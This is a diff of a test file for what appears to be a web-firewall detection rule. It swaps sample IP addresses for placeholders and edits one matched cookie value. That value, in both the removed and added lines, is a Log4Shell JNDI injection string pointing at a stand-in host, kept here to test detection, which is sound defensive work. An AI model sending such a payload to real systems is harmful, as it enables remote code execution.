@@ -26,7 +26,7 @@ Tests:
     ExpectedResult: true
     Log:
       httpRequest:
-        remoteIp: 1.2.3.4
+        remoteIp: 999.999.998.1
         requestMethod: POST
         requestUrl: https://example.com/api/upload
         requestSize: 1024
@@ -45,7 +45,7 @@ Tests:
             - google-mrs-v202512-id000001-rce
           matchedFieldType: COOKIE_VALUES
           matchedFieldName: session
-          matchedFieldValue: ${jndi:ldap://malicious.com/exploit}
+          matchedFieldValue: ${jndi:ldap://example.com/exploit}
           matchedLength: 42
       logName: projects/test-project/logs/requests
       resource:
@@ -60,7 +60,7 @@ Tests:
     ExpectedResult: true
     Log:
       httpRequest:
-        remoteIp: 1.2.3.4
+        remoteIp: 999.999.998.1
         requestMethod: GET
         requestUrl: https://example.com/search?q=malicious
         status: 403
@@ -89,7 +89,7 @@ Tests:
     ExpectedResult: true
     Log:
       httpRequest:
-        remoteIp: 1.2.3.4
+        remoteIp: 999.999.998.1
         requestMethod: POST
         requestUrl: https://example.com/api/data
         status: 200
@@ -117,7 +117,7 @@ Tests:
     ExpectedResult: false
     Log:
       httpRequest:
-        remoteIp: 1.2.3.4
+        remoteIp: 999.999.998.1
         requestMethod: GET
         status: 403
       insertId: vwx678yza
